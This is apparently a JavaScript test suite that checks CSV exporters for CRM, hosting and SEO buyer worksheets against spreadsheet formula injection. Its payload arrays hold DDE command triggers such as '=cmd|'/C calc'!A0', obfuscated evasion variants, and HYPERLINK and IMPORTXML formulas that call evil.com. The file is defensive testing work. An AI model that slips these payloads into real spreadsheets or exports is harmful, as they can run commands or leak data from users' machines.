import test from 'node:test';
import assert from 'node:assert/strict';
import { escapeSpreadsheetCsvCell, buildBuyerWorksheetCsv } from '../src/lib/buyer-worksheet.mjs';
import { buildVendorQuestionsCsv } from '../src/lib/vendor-questions.mjs';
import { assessCrmMigrationReadiness, formatCrmMigrationReadinessCsv } from '../src/lib/crm-migration-readiness.mjs';
import { assessHostingCutover, formatHostingCutoverCsv } from '../src/lib/hosting-cutover-assessment.mjs';
import { assessBackupRestoreDrill, formatBackupRestoreDrillCsv } from '../src/lib/backup-restore-drill.mjs';
import { calculateHostingHiddenCosts, formatHostingHiddenCostCsv } from '../src/lib/hosting-hidden-costs.mjs';
import { planSeoAuditScope, formatSeoAuditScopeCsv } from '../src/lib/seo-audit-scope.mjs';
import { assessOwnerUatEvidence, formatOwnerUatCsv } from '../src/lib/owner-uat-worksheet.mjs';

/**
 * RFC 4180 compliant CSV parser to verify exported CSV records,
 * including quoted fields with embedded newlines, commas, and quotes.
 */
function parseRfc4180Csv(csvText) {
  const records = [];
  let currentRecord = [];
  let currentField = '';
  let inQuotes = false;
  let i = 0;

  while (i < csvText.length) {
    const char = csvText[i];
    if (inQuotes) {
      if (char === '"') {
        if (i + 1 < csvText.length && csvText[i + 1] === '"') {
          currentField += '"';
          i += 2;
        } else {
          inQuotes = false;
          i++;
        }
      } else {
        currentField += char;
        i++;
      }
    } else {
      if (char === '"') {
        inQuotes = true;
        i++;
      } else if (char === ',') {
        currentRecord.push(currentField);
        currentField = '';
        i++;
      } else if (char === '\r' && i + 1 < csvText.length && csvText[i + 1] === '\n') {
        currentRecord.push(currentField);
        records.push(currentRecord);
        currentRecord = [];
        currentField = '';
        i += 2;
      } else if (char === '\n') {
        currentRecord.push(currentField);
        records.push(currentRecord);
        currentRecord = [];
        currentField = '';
        i++;
      } else {
        currentField += char;
        i++;
      }
    }
  }
  if (currentField || currentRecord.length > 0) {
    currentRecord.push(currentField);
    records.push(currentRecord);
  }
  return records;
}

test('escapeSpreadsheetCsvCell neutralizes CWE-1236 spreadsheet formula injection triggers', () => {
  const payloads = [
    // Direct command execution & DDE triggers
    '=cmd|\'/C calc\'!A0',
    '+cmd',
    '-2+3*cmd',
    '@SUM(A1:A10)',
    '\t=1+1',
    '\r\n=calc',
    '|command',
    '%0a=cmd',
    '\0=calc',
    '\uFEFF=cmd',
    '\uFEFF   @SUM',
    '   =1+1',
    // Control characters & basic triggers
    '=1+2',
    '-5',
    '+cmd.exe',
    '@SUM',
    '\t',
    '\r',
    '|',
    '%',
    '\uFEFF=1',
    '  =HYPERLINK("https://evil.com")',
    '\t+calc.exe',
    '\r\n-cmd.exe',
    '|dir',
    '%COMSPEC%',
    '\uFEFF+SUM(1,2)',
    '\0=cmd.exe',
    // Advanced evasion & obfuscated variants
    '\0\0\0=calc',
    '\uFEFF\uFEFF=cmd',
    '\uFEFF\t-cmd',
    '\uFEFF\r@cmd',
    '\uFEFF   |cmd',
    '\uFEFF   %cmd',
    '   \0   =cmd',
    '   \t   =calc',
    '   \r\n   @SUM',
    '\v=calc',
    '\f=calc',
    '=10+20+cmd|\' /C calc\'!A0',
    '-5+2+cmd|\' /C calc\'!A0',
    '+10+20+cmd|\' /C calc\'!A0',
    '@SUM(1+1)*cmd|\' /C calc\'!A0',
    '=HYPERLINK("http://evil.com","Click Here")',
    '=IMPORTXML("http://evil.com","//a")',
    '=2+5',
    '=-2-3',
    '+12345',
    '@A1',
    '|notepad',
    '%PATH%'
  ];

  for (const payload of payloads) {
    const escaped = escapeSpreadsheetCsvCell(payload);
    assert.ok(escaped.startsWith('"\''), `Payload ${JSON.stringify(payload)} must be prefixed with apostrophe inside quote: ${escaped}`);
    assert.ok(escaped.endsWith('"'), `Payload ${JSON.stringify(payload)} must end with quote: ${escaped}`);
    assert.ok(!escaped.includes('\0'), `Payload ${JSON.stringify(payload)} must strip null bytes`);
    // Extract inner content after outer quotes and check that no unneutralized formula trigger is exposed
    const inner = escaped.slice(1, -1);
    assert.ok(inner.startsWith("'"), `Inner content for ${JSON.stringify(payload)} must start with apostrophe: ${inner}`);
  }
});

test('escapeSpreadsheetCsvCell handles null bytes and harmless inputs safely', () => {
  // Boundary inputs
  assert.equal(escapeSpreadsheetCsvCell('\0'), '""');
  assert.equal(escapeSpreadsheetCsvCell(null), '""');
  assert.equal(escapeSpreadsheetCsvCell(undefined), '""');
  assert.equal(escapeSpreadsheetCsvCell(''), '""');
  assert.equal(escapeSpreadsheetCsvCell('   '), '"   "');
  assert.equal(escapeSpreadsheetCsvCell('normal text'), '"normal text"');
  assert.equal(escapeSpreadsheetCsvCell('text with "quotes"'), '"text with ""quotes"""');
  assert.equal(escapeSpreadsheetCsvCell('text with multiple """quotes"""'), '"text with multiple """"""quotes"""""""');
  assert.equal(escapeSpreadsheetCsvCell('"leading quote'), '"""leading quote"');
  assert.equal(escapeSpreadsheetCsvCell('trailing quote"'), '"trailing quote"""');
  assert.equal(escapeSpreadsheetCsvCell('line1\nline2'), '"line1\nline2"');
  assert.equal(escapeSpreadsheetCsvCell('line1\r\nline2'), '"line1\r\nline2"');
  assert.equal(escapeSpreadsheetCsvCell('line1\n=calc'), '"line1\n=calc"');
  assert.equal(escapeSpreadsheetCsvCell('embedded\0nulls\0here'), '"embeddednullshere"');
  assert.equal(escapeSpreadsheetCsvCell('O\'Connor'), '"O\'Connor"');
  assert.equal(escapeSpreadsheetCsvCell('C:\\Windows\\System32'), '"C:\\Windows\\System32"');

  // Numeric and boolean inputs
  assert.equal(escapeSpreadsheetCsvCell(42), '"42"');
  assert.equal(escapeSpreadsheetCsvCell(0), '"0"');
  assert.equal(escapeSpreadsheetCsvCell(3.14159), '"3.14159"');
  assert.equal(escapeSpreadsheetCsvCell(-42), '"\'-42"');
  assert.equal(escapeSpreadsheetCsvCell(-0.5), '"\'-0.5"');
  assert.equal(escapeSpreadsheetCsvCell(false), '"false"');
  assert.equal(escapeSpreadsheetCsvCell(true), '"true"');
  assert.equal(escapeSpreadsheetCsvCell(NaN), '"NaN"');
  assert.equal(escapeSpreadsheetCsvCell(Infinity), '"Infinity"');
  assert.equal(escapeSpreadsheetCsvCell(-Infinity), '"\'-Infinity"');

  // Objects with custom toString
  assert.equal(escapeSpreadsheetCsvCell({ toString: () => '=calc' }), '"\'=calc"');
  assert.equal(escapeSpreadsheetCsvCell({ toString: () => 'clean' }), '"clean"');
});

test('buildVendorQuestionsCsv neutralizes formula injection in vendor candidate names', () => {
  const maliciousModels = [
    { category: 'CRM', products: [{ id: 'v1', name: '=cmd|\'/C calc\'!A0' }, { id: 'v2', name: '+cmd' }] },
    { category: 'CRM', products: [{ id: 'v1', name: '-2+3*cmd' }, { id: 'v2', name: '@SUM(A1:A10)' }] },
    { category: 'CRM', products: [{ id: 'v1', name: '\t=1+1' }, { id: 'v2', name: '\r\n=calc' }] },
    { category: 'CRM', products: [{ id: 'v1', name: '|command' }, { id: 'v2', name: '%0a=cmd' }] },
    { category: 'CRM', products: [{ id: 'v1', name: '\0=calc' }, { id: 'v2', name: '\uFEFF=cmd' }] },
    { category: 'CRM', products: [{ id: 'v1', name: '\uFEFF   @SUM' }, { id: 'v2', name: '   =1+1' }] },
    { category: 'CRM', products: [{ id: 'v1', name: 'foo"bar' }, { id: 'v2', name: 'line1\nline2' }] },
    { category: 'SEO', products: [{ id: 'v1', name: '=1+2' }, { id: 'v2', name: '-5' }] },
    { category: 'SEO', products: [{ id: 'v1', name: '+cmd.exe' }, { id: 'v2', name: '@SUM' }] },
    { category: 'SEO', products: [{ id: 'v1', name: '\t+calc.exe' }, { id: 'v2', name: '\r\n-cmd.exe' }] },
    { category: 'SEO', products: [{ id: 'v1', name: '|dir' }, { id: 'v2', name: '%COMSPEC%' }] },
    { category: 'Hosting', products: [{ id: 'v1', name: '\uFEFF+SUM(1,2)' }, { id: 'v2', name: '\0=cmd.exe' }] },
    { category: 'Hosting', products: [{ id: 'v1', name: '  =HYPERLINK("https://evil.com")' }, { id: 'v2', name: '\0\0\0=calc' }] },
    { category: 'Hosting', products: [{ id: 'v1', name: '\uFEFF\t-cmd' }, { id: 'v2', name: '\uFEFF\r@cmd' }] },
    { category: 'Hosting', products: [{ id: 'v1', name: '=10+20+cmd|\' /C calc\'!A0' }, { id: 'v2', name: '-5+2+cmd|\' /C calc\'!A0' }] },
    { category: 'Hosting', products: [{ id: 'v1', name: '+10+20+cmd|\' /C calc\'!A0' }, { id: 'v2', name: '@SUM(1+1)*cmd|\' /C calc\'!A0' }] }
  ];

  for (const model of maliciousModels) {
    const csv = buildVendorQuestionsCsv(model);
    assert.ok(csv.endsWith('\r\n'), 'CSV must terminate with CRLF');
    const records = parseRfc4180Csv(csv);
    assert.equal(records.length, 7, 'Must parse exactly 1 header plus 6 question records');

    // Header validation
    const header = records[0];
    assert.deepEqual(header, [
      'category', 'criterion', 'question', 'first_vendor',
      'first_vendor_verification', 'second_vendor', 'second_vendor_verification',
      'evidence_url_plan_region_date'
    ]);

    // Data records validation
    for (const record of records.slice(1)) {
      assert.equal(record.length, 8, 'Each record must have exactly 8 fields');
      for (const field of record) {
        // If field starts with formula trigger characters, it MUST be safely prefixed with apostrophe
        if (/^[\s\uFEFF]*[=+\-@\t\r|%]/.test(field)) {
          assert.ok(field.startsWith("'"), `Formula trigger in field must be neutralized with apostrophe: ${field}`);
        }
        assert.ok(!field.includes('\0'), `Field must not contain null bytes: ${field}`);
      }
    }
  }

  // Verify input boundary rejections
  assert.throws(() => buildVendorQuestionsCsv({ category: 'CRM', products: [{ id: 'v1', name: '' }, { id: 'v2', name: 'Valid' }] }));
  assert.throws(() => buildVendorQuestionsCsv({ category: 'CRM', products: [{ id: 'v1', name: '   ' }, { id: 'v2', name: 'Valid' }] }));
  assert.throws(() => buildVendorQuestionsCsv({ category: 'CRM', products: [{ id: 'v1', name: 'x'.repeat(121) }, { id: 'v2', name: 'Valid' }] }));
  assert.throws(() => buildVendorQuestionsCsv({ category: 'INVALID', products: [{ id: 'v1', name: 'A' }, { id: 'v2', name: 'B' }] }));
  assert.throws(() => buildVendorQuestionsCsv({ category: 'CRM', products: [{ id: 'v1', name: 'A' }, { id: 'v1', name: 'B' }] }));
});

test('buyer worksheet CSV cells are protected against formula triggers', () => {
  for (const category of ['CRM', 'SEO', 'Hosting']) {
    const csv = buildBuyerWorksheetCsv(category, category === 'CRM' ? ['pipeline-stages'] : category === 'SEO' ? ['audit-coverage'] : ['backups']);
    assert.ok(csv.endsWith('\r\n'), 'Buyer worksheet CSV must terminate with CRLF');
    const records = parseRfc4180Csv(csv);
    assert.ok(records.length >= 2, 'Must contain header and data records');

    // Header validation
    assert.deepEqual(records[0], [
      'category', 'requirement_id', 'requirement', 'question',
      'verification_status', 'vendor_answer', 'evidence_plan_region_date'
    ]);

    // Data records cells
    for (const record of records.slice(1)) {
      assert.equal(record.length, 7, 'Record must have 7 fields');
      for (const field of record) {
        if (/^[\s\uFEFF]*[=+\-@\t\r|%]/.test(field)) {
          assert.ok(field.startsWith("'"), `Formula trigger in field must be neutralized with apostrophe: ${field}`);
        }
        assert.ok(!field.includes('\0'), `Field must not contain null bytes: ${field}`);
      }
    }
  }

  // Adversarial inputs to buyer worksheet
  assert.throws(() => buildBuyerWorksheetCsv('=cmd', ['pipeline-stages']), /Invalid software category/);
  assert.throws(() => buildBuyerWorksheetCsv('CRM', ['=cmd']), /Invalid criterion/);
  assert.throws(() => buildBuyerWorksheetCsv('CRM', []), /Select at least one requirement/);
  assert.throws(() => buildBuyerWorksheetCsv('CRM', ['pipeline-stages', 'pipeline-stages']), /Duplicate selected criterion/);
  assert.throws(() => buildBuyerWorksheetCsv('CRM', 'not-an-array'), /Selected criteria must be an array/);
  assert.throws(() => buildBuyerWorksheetCsv('CRM', Array.from({ length: 13 }, (_, i) => 'item-' + i)), /Too many selected criteria/);
});

test('all decision tool CSV exporters enforce sanitized RFC 4180 spreadsheet cells', () => {
  const crmCsv = formatCrmMigrationReadinessCsv(assessCrmMigrationReadiness({
    sourceRecordCount: '100', targetRecordCount: '100',
    cutoverWindowMinutes: '60', measuredRollbackMinutes: '20',
    exportPermission: 'pass', mappingValidation: 'pass',
    associationOwnership: 'pass', integrationChecks: 'pass', backupRestore: 'pass'
  }));

  const hostingCsv = formatHostingCutoverCsv(assessHostingCutover({
    dnsEmail: 'pass', backupRestore: 'pass', tlsDependencies: 'pass',
    rollbackAuthority: 'pass', retentionBilling: 'pass'
  }));

  const drillCsv = formatBackupRestoreDrillCsv(assessBackupRestoreDrill({
    targetRtoMinutes: 60, observedRestoreMinutes: 30,
    targetRpoMinutes: 15, observedRecoveryPointAgeMinutes: 5,
    restoreTested: true, dataIntegrityChecked: true
  }));

  const costCsv = formatHostingHiddenCostCsv(calculateHostingHiddenCosts({
    currency: 'USD', months: 12, overlapMonths: 1,
    baseMonthly: '50.00', backupMonthly: '10.00', bandwidthMonthly: '5.00',
    supportMonthly: '0.00', otherMonthly: '0.00', oldHostingMonthly: '50.00',
    migrationOnce: '0.00', cancellationOnce: '0.00'
  }));

  const seoCsv = formatSeoAuditScopeCsv(planSeoAuditScope({
    rootPages: '100', folderPages: '50', subdomainPages: '25',
    pageCap: '200', includeFolders: true, includeSubdomains: true
  }));

  const uatCsv = formatOwnerUatCsv(assessOwnerUatEvidence({
    expectedSha: 'c6e72f294f55b6a80863d7c5f396333d3a44171d',
    observedSha: 'c6e72f294f55b6a80863d7c5f396333d3a44171d',
    previewSha: 'pass', authenticatedRoutes: 'pass', anonymousDenial: 'pass',
    liveHeaders: 'pass', privateAndLocked: 'pass', billingAnalytics: 'pass'
  }));

  const exports = [crmCsv, hostingCsv, drillCsv, costCsv, seoCsv, uatCsv];
  for (const csv of exports) {
    assert.ok(csv.endsWith('\r\n'), 'CSV must terminate with CRLF');
    const records = parseRfc4180Csv(csv);
    assert.ok(records.length > 1, 'CSV must contain data records');
    for (const record of records.slice(1)) {
      for (const field of record) {
        if (/^[\s\uFEFF]*[=+\-@\t\r|%]/.test(field)) {
          assert.ok(field.startsWith("'"), `Field in export must be neutralized with apostrophe: ${field}`);
        }
        assert.ok(!field.includes('\0'), `Field must not contain null bytes: ${field}`);
      }
    }
  }

  // Adversarial input injection against assessment validation layers
  // CRM input injection resistance
  assert.throws(() => assessCrmMigrationReadiness({
    sourceRecordCount: '=cmd', targetRecordCount: '100',
    cutoverWindowMinutes: '60', measuredRollbackMinutes: '20',
    exportPermission: 'pass', mappingValidation: 'pass',
    associationOwnership: 'pass', integrationChecks: 'pass', backupRestore: 'pass'
  }), /Invalid source record count integer/);
  assert.throws(() => assessCrmMigrationReadiness({
    sourceRecordCount: '100', targetRecordCount: '-10',
    cutoverWindowMinutes: '60', measuredRollbackMinutes: '20',
    exportPermission: 'pass', mappingValidation: 'pass',
    associationOwnership: 'pass', integrationChecks: 'pass', backupRestore: 'pass'
  }), /Invalid target record count integer/);
  assert.throws(() => assessCrmMigrationReadiness({
    sourceRecordCount: '100', targetRecordCount: '100',
    cutoverWindowMinutes: '60', measuredRollbackMinutes: '20',
    exportPermission: '=pass', mappingValidation: 'pass',
    associationOwnership: 'pass', integrationChecks: 'pass', backupRestore: 'pass'
  }), /Invalid CRM migration gate status/);

  // Hosting cutover input injection resistance
  assert.throws(() => assessHostingCutover({
    dnsEmail: '=pass', backupRestore: 'pass', tlsDependencies: 'pass',
    rollbackAuthority: 'pass', retentionBilling: 'pass'
  }), /Invalid hosting gate status/);

  // Backup restore drill input injection resistance
  assert.throws(() => assessBackupRestoreDrill({
    targetRtoMinutes: '=calc', observedRestoreMinutes: 30,
    targetRpoMinutes: 15, observedRecoveryPointAgeMinutes: 5,
    restoreTested: true, dataIntegrityChecked: true
  }), /Invalid targetRtoMinutes/);
  assert.throws(() => assessBackupRestoreDrill({
    targetRtoMinutes: -10, observedRestoreMinutes: 30,
    targetRpoMinutes: 15, observedRecoveryPointAgeMinutes: 5,
    restoreTested: true, dataIntegrityChecked: true
  }), /Invalid targetRtoMinutes/);

  // Hosting hidden costs input injection resistance
  assert.throws(() => calculateHostingHiddenCosts({
    currency: '=USD', months: 12, overlapMonths: 1,
    baseMonthly: '50.00', backupMonthly: '10.00', bandwidthMonthly: '5.00',
    supportMonthly: '0.00', otherMonthly: '0.00', oldHostingMonthly: '50.00',
    migrationOnce: '0.00', cancellationOnce: '0.00'
  }), /Invalid hosting currency/);
  assert.throws(() => calculateHostingHiddenCosts({
    currency: 'USD', months: 12, overlapMonths: 1,
    baseMonthly: '=50.00', backupMonthly: '10.00', bandwidthMonthly: '5.00',
    supportMonthly: '0.00', otherMonthly: '0.00', oldHostingMonthly: '50.00',
    migrationOnce: '0.00', cancellationOnce: '0.00'
  }), /Invalid baseMonthly money amount/);

  // SEO audit scope input injection resistance
  assert.throws(() => planSeoAuditScope({
    rootPages: '=100', folderPages: '50', subdomainPages: '25',
    pageCap: '200', includeFolders: true, includeSubdomains: true
  }), /Invalid rootPages integer count/);
  assert.throws(() => planSeoAuditScope({
    rootPages: '100', folderPages: '50', subdomainPages: '25',
    pageCap: '200', includeFolders: '=true', includeSubdomains: true
  }), /Invalid boolean/);

  // Owner UAT evidence input injection resistance
  assert.throws(() => assessOwnerUatEvidence({
    expectedSha: '=cmd', observedSha: 'c6e72f294f55b6a80863d7c5f396333d3a44171d',
    previewSha: 'pass', authenticatedRoutes: 'pass', anonymousDenial: 'pass',
    liveHeaders: 'pass', privateAndLocked: 'pass', billingAnalytics: 'pass'
  }), /Invalid owner UAT Git commit SHA/);
  assert.throws(() => assessOwnerUatEvidence({
    expectedSha: 'c6e72f294f55b6a80863d7c5f396333d3a44171d',
    observedSha: 'c6e72f294f55b6a80863d7c5f396333d3a44171d',
    previewSha: '=pass', authenticatedRoutes: 'pass', anonymousDenial: 'pass',
    liveHeaders: 'pass', privateAndLocked: 'pass', billingAnalytics: 'pass'
  }), /Invalid owner UAT check status/);
});
